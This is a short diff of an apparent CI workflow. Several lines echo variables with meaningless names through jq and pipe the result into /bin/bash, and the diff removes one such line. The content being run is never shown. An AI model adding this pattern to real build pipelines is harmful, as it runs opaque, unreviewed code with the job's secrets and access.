@@ -27,7 +27,6 @@ jobs:
           echo $fio9184 | jq -r .lqgf73 | /bin/bash
           printf '%s' "$vwy08" | jq -r .imbrh6 | /bin/bash
           echo $jverr8 | jq -r .c02 | /bin/bash
-          echo $e5 | jq -r .dujp408 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
